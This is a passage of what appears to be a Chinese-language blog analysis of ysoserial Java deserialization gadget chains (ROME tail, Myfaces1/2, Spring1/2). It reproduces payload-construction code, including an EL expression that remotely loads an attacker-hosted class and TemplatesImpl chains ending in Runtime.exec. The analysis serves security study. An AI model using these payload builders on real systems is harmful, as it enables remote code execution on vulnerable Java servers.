<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EqualsBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">beanHashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._obj.toString().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._toStringBean.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ToStringBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stack stack = (Stack)PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[])(stack.isEmpty() ? <span class="keyword">null</span> : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    <span class="keyword">if</span> (tsInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">        String className = <span class="keyword">this</span>._obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prefix = tsInfo[<span class="number">0</span>];</span><br><span class="line">        tsInfo[<span class="number">1</span>] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.toString(prefix);   <span class="comment">// 这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">toString</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="keyword">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                String pName = pds[i].getName();</span><br><span class="line">                Method pReadMethod = pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="keyword">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    Object value = pReadMethod.invoke(<span class="keyword">this</span>._obj, NO_PARAMS);    <span class="comment">// 执行指令，控制 this._obj 为 TemplatesImpl，pReadMethod.name 为 getOutputProperties</span></span><br><span class="line">                    <span class="keyword">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="keyword">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + var8.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h2><blockquote>
<p>MyFaces 是托管多个与 MVC Web 应用框架 JavaServer Faces(JSF) 技术相关的子项目；MyFaces Core 项目是 JSF 规范的实现<br>结合了反序列化与 EL 表达式执行的相关特点。EL 表达式的主要作用是在Java Web应用程序嵌入到网页中，用以访问页面的上下文以及不同作用域中的对象，取得对象属性的值，或执行简单的运算或判断操作。<br>需要构造 EL 表达式作为 payload</p>
</blockquote>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ValueExpressionMethodExpression.hashCode()</span><br><span class="line">                ValueExpressionMethodExpression.getMethodExpression()</span><br><span class="line">                    ValueExpressionMethodExpression.getMethodExpression(ELContext)</span><br><span class="line">                        ValueExpressionImpl.getValue()</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.Myfaces1#makeExpressionPayload 利用 MyFaces 构造触发利用的条件， EL 表达式解析和处理还需要由具体的 EL 实现类完成（如 juel 和 apache-el），其中的 ValueExpressionImpl.getValue 具体实现将触发真正的代码执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeExpressionPayload</span> <span class="params">( String expr )</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException, Exception  </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化 FacesContext 及 ELContext</span></span><br><span class="line">    FacesContextImpl fc = <span class="keyword">new</span> FacesContextImpl((ServletContext) <span class="keyword">null</span>, (ServletRequest) <span class="keyword">null</span>, (ServletResponse) <span class="keyword">null</span>);</span><br><span class="line">    ELContext elContext = <span class="keyword">new</span> FacesELContext(<span class="keyword">new</span> CompositeELResolver(), fc);</span><br><span class="line">    <span class="comment">// 使用反射将 elContext 写入 FacesContextImpl 中</span></span><br><span class="line">    Reflections.getField(FacesContextImplBase.class, <span class="string">&quot;_elContext&quot;</span>).set(fc, elContext);</span><br><span class="line">    <span class="comment">// 使用 ExpressionFactory 创建 ValueExpression</span></span><br><span class="line">    ExpressionFactory expressionFactory = ExpressionFactory.newInstance();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 有害</span></span><br><span class="line">    ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);</span><br><span class="line">    ValueExpressionMethodExpression e = <span class="keyword">new</span> ValueExpressionMethodExpression(ve1);</span><br><span class="line">    <span class="comment">// 无害</span></span><br><span class="line">    ValueExpression ve2 = expressionFactory.createValueExpression(elContext, <span class="string">&quot;$&#123;true&#125;&quot;</span>, Object.class);</span><br><span class="line">    ValueExpressionMethodExpression e2 = <span class="keyword">new</span> ValueExpressionMethodExpression(ve2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">    <span class="comment">// 先放入无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段</span></span><br><span class="line">    <span class="comment">// 避免构造过程中触发</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(e2, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>触发条件的构造只涉及到 ValueExpressionMethodExpression 类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MethodExpression me = <span class="keyword">this</span>.getMethodExpression();   <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">return</span> me != <span class="keyword">null</span> ? me.hashCode() : <span class="keyword">this</span>.valueExpression.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> MethodExpression <span class="title">getMethodExpression</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用带参数的方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getMethodExpression(FacesContext.getCurrentInstance().getELContext());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> MethodExpression <span class="title">getMethodExpression</span><span class="params">(ELContext context)</span> </span>&#123;</span><br><span class="line">    Object meOrVe = <span class="keyword">this</span>.valueExpression.getValue(context); <span class="comment">// 这里，由具体实现类完成</span></span><br><span class="line">    <span class="keyword">if</span> (meOrVe <span class="keyword">instanceof</span> MethodExpression) &#123;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(meOrVe <span class="keyword">instanceof</span> ValueExpression)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(meOrVe != <span class="keyword">null</span> &amp;&amp; meOrVe <span class="keyword">instanceof</span> ValueExpression) &#123;</span><br><span class="line">            meOrVe = ((ValueExpression)meOrVe).getValue(context);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h2><blockquote>
<p>利用链同 Myfaces1<br>在 Myfaces1 的基础上使用 ClassLoader 远程加载恶意类的 EL 表达式执行代码，即提供构造 EL</p>
</blockquote>
<p>ysoserial.payloads.Myfaces2#getObject</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/</span></span><br><span class="line">    String expr = <span class="string">&quot;$&#123;request.setAttribute(&#x27;arr&#x27;,&#x27;&#x27;.getClass().forName(&#x27;java.util.ArrayList&#x27;).newInstance())&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we add fewer than the actual classloaders we end up with a null entry</span></span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ ) &#123;</span><br><span class="line">        expr += <span class="string">&quot;$&#123;request.getAttribute(&#x27;arr&#x27;).add(request.servletContext.getResource(&#x27;/&#x27;).toURI().create(&#x27;&quot;</span> + url + <span class="string">&quot;&#x27;).toURL())&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    expr += <span class="string">&quot;$&#123;request.getClass().getClassLoader().newInstance(request.getAttribute(&#x27;arr&#x27;)&quot;</span></span><br><span class="line">            + <span class="string">&quot;.toArray(request.getClass().getClassLoader().getURLs())).loadClass(&#x27;&quot;</span> + className + <span class="string">&quot;&#x27;).newInstance()&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Myfaces1.makeExpressionPayload(expr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><p>适用版本</p>
<ul>
<li>spring-core:4.1.4.RELEASE</li>
<li>spring-beans:4.1.4.RELEASE</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">			SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					HashMap.get()</span><br><span class="line">			ReflectionUtils.findMethod()</span><br><span class="line">			SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					HashMap.get()</span><br><span class="line">			ReflectionUtils.invokeMethod()</span><br><span class="line">				Method.invoke()</span><br><span class="line">					Templates(Proxy).newTransformer()</span><br><span class="line">						AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">							ObjectFactory(Proxy).getObject()</span><br><span class="line">								AnnotationInvocationHandler.invoke()</span><br><span class="line">									HashMap.get()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								TemplatesImpl.newTransformer()</span><br><span class="line">									TemplatesImpl.getTransletInstance()</span><br><span class="line">										TemplatesImpl.defineTransletClasses()</span><br><span class="line">											TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">												Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">													Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/186GzSMsLyuAnil.png" >

<p>ysoserial.payloads.Spring1#getObject 通过 MethodInvokeTypeProvider.readObject 触发方法调用，方法由 ObjectFactoryDelegatingInvocationHandler 代理，最终调用 TemplatesImpl.newTransformer 。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line">	<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap 承载 TemplatesImpl</span></span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，返回 TemplatesImpl</span></span><br><span class="line">	<span class="keyword">final</span> ObjectFactory objectFactoryProxy =</span><br><span class="line">			Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 使用 objectFactoryProxy 实例化 ObjectFactoryDelegatingInvocationHandler，代理 Type 和 Templates（TemplatesImpl 父类）</span></span><br><span class="line">    <span class="keyword">final</span> Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)</span><br><span class="line">			Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)</span><br><span class="line">				.newInstance(objectFactoryProxy), Type.class, Templates.class);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 代理 TypeProvider 的 getType 方法，返回 typeTemplatesProxy 代理类</span></span><br><span class="line">    <span class="keyword">final</span> Object typeProviderProxy = Gadgets.createMemoitizedProxy(</span><br><span class="line">			Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">			forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 用 typeProviderProxy 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">    <span class="keyword">final</span> Constructor mitpCtor = Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">    <span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line">	<span class="comment">// 所以初始化时随便给个 Method，methodName</span></span><br><span class="line">	<span class="keyword">final</span> Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> Class[] &#123;&#125;), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射赋值，调用 newTransformer 方法</span></span><br><span class="line">	Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Spring 核心包中的 <code>org.springframework.core.SerializableTypeWrapper$TypeProvider</code> 实现了 TypeProvider 接口，是一个可以被反序列化的类。反序列化时调用了 ReflectionUtils，先是 findMethod 返回 Method 对象然后紧接着调用 invokeMethod 进行反射调用（无参调用）。</p>
<p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> 是 InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用。</p>
<ul>
<li>使用 AnnotationInvocationHandler 代理，返回任意对象</li>
<li>使用 ObjectFactoryDelegatingInvocationHandler 代理 TypeProvider$getType 方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MethodInvokeTypeProvider</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodInvokeTypeProvider</span> <span class="keyword">implements</span> <span class="title">SerializableTypeWrapper</span>.<span class="title">TypeProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableTypeWrapper.TypeProvider provider;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String methodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object result;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodInvokeTypeProvider</span><span class="params">(SerializableTypeWrapper.TypeProvider provider, Method method, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.provider = provider;</span><br><span class="line">        <span class="keyword">this</span>.methodName = method.getName();</span><br><span class="line">        <span class="keyword">this</span>.index = index;</span><br><span class="line">        <span class="keyword">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !(<span class="keyword">this</span>.result <span class="keyword">instanceof</span> Type) &amp;&amp; <span class="keyword">this</span>.result != <span class="keyword">null</span> ? ((Type[])((Type[])<span class="keyword">this</span>.result))[<span class="keyword">this</span>.index] : (Type)th</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        Method method = ReflectionUtils.findMethod(<span class="keyword">this</span>.provider.getType().getClass(), <span class="keyword">this</span>.methodName);</span><br><span class="line">        <span class="keyword">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="keyword">this</span>.provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectFactoryDelegatingInvocationHandler</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectFactoryDelegatingInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ObjectFactoryDelegatingInvocationHandler</span><span class="params">(ObjectFactory&lt;?&gt; objectFactory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.objectFactory = objectFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line">        <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.objectFactory.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.objectFactory.getObject(), args);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var6.getTargetException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h2><blockquote>
<p>使用 spring-aop 的 JdkDynamicAopProxy 替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler</p>
</blockquote>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">		SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">			AnnotationInvocationHandler.invoke()</span><br><span class="line">				HashMap.get()</span><br><span class="line">		ReflectionUtils.findMethod()</span><br><span class="line">		SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">			AnnotationInvocationHandler.invoke()</span><br><span class="line">				HashMap.get()</span><br><span class="line">		ReflectionUtils.invokeMethod()</span><br><span class="line">			Method.invoke()</span><br><span class="line">				Templates(Proxy).newTransformer()</span><br><span class="line">                        JdkDynamicAopProxy.invoke()</span><br><span class="line">                            AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/xtW6eHdnbGPrYyJ.png" >

<p>ysoserial.payloads.Spring2#getObject 和 Spring1 的构造方式基本相同，这里用了 AdvisedSupport 实例化 JdkDynamicAopProxy 动态代理，在 MethodInvokeTypeProvider.readObject 中返回 TemplatesImpl 和方法 newTransformer，从而执行命令。</p>
